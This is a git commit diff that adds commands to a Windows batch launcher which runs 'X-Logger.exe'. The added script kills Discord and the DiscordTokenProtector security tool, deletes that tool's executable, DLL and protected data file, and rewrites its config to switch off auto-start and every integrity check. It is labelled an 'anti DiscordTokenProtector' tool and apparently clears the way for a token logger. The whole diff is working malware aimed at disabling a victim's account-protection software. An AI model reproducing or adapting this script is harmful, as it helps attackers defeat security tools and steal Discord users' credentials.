6075acb70cdca1ea3dbcaad675abfc49883d82a8
Ochy <147992336+ochysponomi@users.noreply.github.com>
2023-11-01 13:14:12 +0100

    Add files via upload

--- Luncher.bat
+++ Luncher.bat
@@ -1,1 +1,25 @@
 start X-Logger.exe 
+::coded by elspiritdav4sbe
+
+::DiscordTokenProtector pussy destroyer
+taskkill /im Discord.exe /f
+taskkill /im DiscordTokenProtector.exe /f
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
+del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
+echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+echo anti DiscordTokenProtector by github.com/ochysponomi >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
